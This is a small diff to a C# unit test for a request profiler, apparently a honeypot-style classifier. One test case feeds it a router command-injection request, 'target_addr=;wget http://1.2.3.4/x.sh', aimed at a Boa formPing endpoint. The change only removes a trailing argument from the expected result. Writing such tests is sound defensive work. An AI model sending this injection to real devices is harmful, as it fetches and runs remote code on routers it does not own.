@@ -56,7 +56,7 @@ public sealed class RequestProfilerTests
     {
         var profile = RequestProfiler.Profile("203.0.113.7", "/boaform/admin/formPing", "target_addr=;wget http://1.2.3.4/x.sh");
 
-        Assert.AreEqual(new RequestProfile(ResponseKind.Exploit, "Realtek-based home router web interface, and the response contains the output of the shell command in the request", "Boa/0.94.14rc21", false), profile);
+        Assert.AreEqual(new RequestProfile(ResponseKind.Exploit, "Realtek-based home router web interface, and the response contains the output of the shell command in the request", "Boa/0.94.14rc21"), profile);
     }
 
     [TestMethod]
